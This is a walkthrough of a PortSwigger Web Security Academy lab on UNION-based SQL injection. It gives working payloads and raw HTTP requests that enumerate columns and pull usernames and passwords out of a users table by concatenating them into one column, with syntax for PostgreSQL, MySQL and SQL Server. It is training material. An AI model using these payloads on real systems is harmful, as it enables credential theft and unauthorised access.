# SQL Injection - Lab #6: SQL injection UNION attack, retrieving multiple values in a single column

**YouTube Tutorial:** [SQL Injection - Lab #6 SQL injection UNION attack, retrieving multiple values in a single column](https://www.youtube.com/watch?v=yRVYoqR9vrI)

---

## 1. Attack Overview & Key Concepts

### Vulnerability Explanation

* **Core Concept:** A SQL injection vulnerability exists in the product category filter (`category`). The application processes user input directly into an SQL query and returns the query results directly within the HTTP response body.
* **Vulnerability Behavior:** Because the response contains database output, an attacker can leverage a `UNION`-based SQL injection to append their own database queries and extract data.

### Root Cause & Impact

* **Root Cause:** Unsanitized string concatenation in backend database queries.
* **Requirements for UNION Exploitation:**
1. The injected `SELECT` query must return the exact same number of columns as the original query.
2. The data types of corresponding columns must be compatible across both queries.


* **Goal:** When the query returns multiple columns but only a single column is capable of holding or displaying text data, use string concatenation (e.g., using `||` in PostgreSQL/Oracle or `CONCAT()` in MySQL) to retrieve both `username` and `password` from the `users` table within that single column, then log in as the `administrator` user.

---

## 2. Attack Methods & Techniques

### Method Details

* **Phase 1 (Column Count Enumeration):** Use `ORDER BY N--` to identify the total number of columns returned by the query.
* **Phase 2 (Data Type Identification):** Systematically replace each `NULL` value in the `UNION SELECT` statement with a string literal (e.g., `'a'`) to verify which columns can render text on the page.
* **Phase 3 (Data Concatenation & Extraction):** Concatenate multiple database fields into a single string using a delimiter (e.g., `username || '~' || password`) to extract both values in a single string column.

### Server Behavior

* **Incompatible Data Type / Syntax Error:** If `ORDER BY` exceeds the valid column index or if a non-string column is tested with text, the database throws an error, resulting in an **HTTP 500 Internal Server Error**.
* **Compatible Data Type / Successful Attack:** When column count and data types match, the server returns an **HTTP 200 OK** and renders the concatenated database values on the page.

---

## 3. Attack Flowchart

```
+-------------------------------------------------------+
|  Step 1: Intercept Product Filter Request (category)  |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 2: Determine Column Count (ORDER BY N--)        |
|  • ORDER BY 1, 2 -> HTTP 200 OK                       |
|  • ORDER BY 3    -> HTTP 500 Error                    |
|  Result: Total = 2 Columns                            |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 3: Test Data Types (UNION SELECT 'a'...)        |
|  • UNION SELECT 'a', NULL -> HTTP 500 Error           |
|  • UNION SELECT NULL, 'a' -> HTTP 200 OK              |
|  Result: Only Column 2 is string-compatible           |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 4: Concatenate & Extract Credentials            |
|  UNION SELECT NULL, username || '~' || password       |
|  FROM users--                                         |
|  -> HTTP 200 OK (Rendered as administrator~password)  |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 5: Extract Administrator Password & Log In      |
|  -> HTTP 200 OK (Lab Solved)                          |
+-------------------------------------------------------+

```

---

## 4. UML Sequence Diagram

```
Browser / User          Burp Suite Proxy          Web Application               Database
      |                         |                        |                         |
      |-- 1. GET /filter?cat=Gifts' ORDER BY 3-- ------->|                         |
      |                         |                        |-- 2. Execute SQL ------>|
      |                         |                        |<-- 3. Out-Of-Bounds ----|
      |<-- 4. HTTP 500 Error ---|<-- 5. Return 500 -------|                         |
      |                         |                        |                         |
      |== 6. Column count confirmed = 2 columns ===================================|
      |                         |                        |                         |
      |-- 7. GET /filter?cat=Gifts' UNION SELECT NULL, username||'~'||password FROM users-- ->|
      |                         |                        |-- 8. Execute UNION ---->|
      |                         |                        |<-- 9. Concatenated Data |
      |<-- 10. HTTP 200 OK -----|<-- 11. Render Credentials |                         |
      |                         |                        |                         |
      |-- 12. POST /login (administrator credentials) -->|                         |
      |                         |                        |-- 13. Validate User --->|
      |                         |                        |<-- 14. Session Created  |
      |<-- 15. Lab Solved! -----|<-- 16. HTTP 200 OK -----|                         |

```

---

## 5. Step-by-Step Walkthrough

### Step 1: Determine Column Count

1. Test index ordering using `ORDER BY`:
* `GET /filter?category=Gifts'+ORDER+BY+1--` $\rightarrow$ **HTTP 200 OK**
* `GET /filter?category=Gifts'+ORDER+BY+2--` $\rightarrow$ **HTTP 200 OK**
* `GET /filter?category=Gifts'+ORDER+BY+3--` $\rightarrow$ **HTTP 500 Internal Server Error**


2. **Result:** Query returns **2 columns**.

### Step 2: Identify String-Compatible Column Positions

Iteratively test each column position with a string value while keeping the others as `NULL`.

* **Test Column 1:**
`GET /filter?category=Gifts'+UNION+SELECT+'a',+NULL--`
$\rightarrow$ **HTTP 500 Internal Server Error** *(Column 1 is non-string)*.
* **Test Column 2:**
`GET /filter?category=Gifts'+UNION+SELECT+NULL,+'a'--`
$\rightarrow$ **HTTP 200 OK** *(Column 2 accepts string values)*.

### Step 3: Extract User Credentials via String Concatenation

Since only **1 column** supports text, concatenate `username` and `password` with a custom separator (e.g., `~`) into that single column position:

* **Payload:**
```sql
Gifts' UNION SELECT NULL, username || '~' || password FROM users--

```


* **Raw Request:**
```http
GET /filter?category=Gifts%27+UNION+SELECT+NULL%2C+username%7C%7C%27~%27%7C%7Cpassword+FROM+users-- HTTP/1.1
Host: [LAB-ID].web-security-academy.net

```


* **Response:** **HTTP 200 OK** $\rightarrow$ User credentials appear rendered in the format `administrator~s3cr3tp4ss`.

### Step 4: Complete the Lab

1. Extract the administrator password portion following the `~` character.
2. Navigate to `/login`.
3. Log in with `administrator` and the extracted password.
4. **Response:** **HTTP 200 OK** $\rightarrow$ **Lab Solved Successfully**.

---

## 6. Pro-Tips & Common Pitfalls

* **Single Column Limitation:** When only one returned column supports string types, attempting `UNION SELECT username, password` fails because it expects two string columns. Concatenation combines both fields into a single column.
* **DBMS-Specific Concatenation Syntax:**
* **PostgreSQL / Oracle / SQLite:** `username || '~' || password`
* **MySQL:** `CONCAT(username, '~', password)` (Note space after CONCAT or `--+` comments)
* **Microsoft SQL Server:** `username + '~' + password`


* **Custom Separators:** Always choose a distinct separator character (e.g., `~`, `:`, `||`) that does not naturally occur in usernames or passwords to easily distinguish where the username ends and the password begins.